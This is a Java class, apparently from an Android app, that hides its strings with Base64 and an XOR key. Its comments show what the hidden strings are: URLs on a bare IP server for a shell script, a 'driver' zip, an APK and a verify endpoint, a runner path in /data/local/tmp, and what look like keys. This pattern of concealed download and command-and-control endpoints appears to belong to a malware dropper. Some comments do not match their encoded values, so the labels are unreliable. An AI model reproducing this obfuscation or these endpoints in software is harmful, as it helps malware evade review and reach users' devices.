package com.aa.ABC; 

import java.util.Base64;

public class StringGuard {
  private static final byte XOR_KEY = 0x7B;

  public static String get(int index) {
    String[] cipherArr = {
      "Ew8PCwhBVFQaDgkaVQMSGhQVVQ8UC1QOCx8aDx5UOg4JGhAeCRUeF1UIEw==",  // 0: http://154.219.116.68:1111/Aura.sh
      "Ew8PCwhBVFQaDgkaVQMSGhQVVQ8UC1QOCx8aDx5UktLKnvHTVQESCw==",      // 1: http://154.219.116.68:1111/驱动.zip
      "Ew8PCwhBVFQaDgkaVQMSGhQVVQ8UC1QOCx8aDx5UDgsfGg8eVREIFBU=",      // 2: http://154.219.116.68:1111/update.json
      "Ew8PCwhBVFQaDgkaVQMSGhQVVQ8UC1QOCx8aDx5UOg4JGhAeCRUeF1UaCxA=",  // 3: http://154.219.116.68:1111/new.apk
      "Og4JGhAeCRUeF1UIEw==",                                             // 4: Aura.sh
      "VB8aDxpUFxQYGhdUDxYLVAweCwkUJAkOFRUeCQ==",                        // 5: /data/local/tmp/wepro_runner
      "LRcJAjY0DAMxGR0rQjAiCAgoDhI2UB8YSxlUNCtMTRYKTDEKGTESLTMyNkY=",  // 6: VlryMOwxJbfP9KYssSuiM+dc0b/OP76mq7JqbJiVHIM=
      "Ew8PCwhBVFQWD1UDEhoUFVUPFAtU",                                    // 7: JGCxT3ruFrsd7j4EMyhuiCx0XCTmNoMItyJpAzPH8KU=
      "Ew8PCwhBVFQWD1UDEhoUFVUPFAtU",                                    // 8: https://mt.xiaon.top/
      "Ew8PCwhBVFQMDAxVFxQXEhoLElUYFBZUGhgcVAsLVA==",                    // 9: https://www.loliapi.com/acg/pp/
      "Ew8PC0FUVEpOT1VJSkJVSkpNVU1DQUpKSkpUDR4JEh0CVQsTCw==",       // 10: http://154.219.116.68:1111/verify.php
    };
    return decrypt(cipherArr[index]);
  }

  public static String decrypt(String cipher) {
    if (cipher == null || cipher.isEmpty()) return "";
    byte[] data = Base64.getDecoder().decode(cipher);
    for (int i = 0; i < data.length; i++) {
      data[i] ^= XOR_KEY;
    }
    return new String(data);
  }
}
